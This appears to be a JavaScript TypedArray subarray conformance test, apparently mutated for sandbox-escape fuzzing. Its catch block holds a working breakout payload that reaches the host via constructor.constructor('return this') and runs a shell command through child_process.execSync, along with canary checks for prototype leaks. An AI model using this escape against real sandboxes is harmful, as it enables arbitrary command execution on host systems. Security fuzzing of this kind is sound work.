try {
    var obj = {
        valueOf: function () {
            throw () => {
                return () => {
                };
            };
            return 2;
        }
    };
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            40,
            41,
            42,
            43
        ]);
        assert(compareArray(sample.subarray(false), [
            40,
            41,
            42,
            43
        ]), 'false');
        assert(compareArray(sample.subarray(true), [
            41,
            42,
            43
        ]), 'true');
        assert(compareArray(sample.subarray(NaN), [
            40,
            41,
            42,
            43
        ]), 'NaN');
        assert(compareArray(sample.subarray(null), [
            40,
            41,
            42,
            43
        ]), 'null');
        assert(compareArray(sample.subarray(undefined), [
            40,
            41,
            42,
            43
        ]), 'undefined');
        assert(compareArray(sample.subarray(1.1), [
            41,
            42,
            43
        ]), '1.1');
        assert(compareArray(sample.subarray(1.5), [
            41,
            42,
            43
        ]), '1.5');
        assert(compareArray(sample.subarray(0.6), [
            40,
            41,
            42,
            43
        ]), '0.6');
        assert(compareArray(sample.subarray(-1.5), [43]), '-1.5');
        assert(compareArray(sample.subarray(-1.1), [43]), '-1.1');
        assert(compareArray(sample.subarray(-0.6), [
            40,
            41,
            42,
            43
        ]), '-0.6');
        assert(compareArray(sample.subarray('3'), [43]), 'string');
        assert(compareArray(sample.subarray(obj), [
            42,
            43
        ]), 'object');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}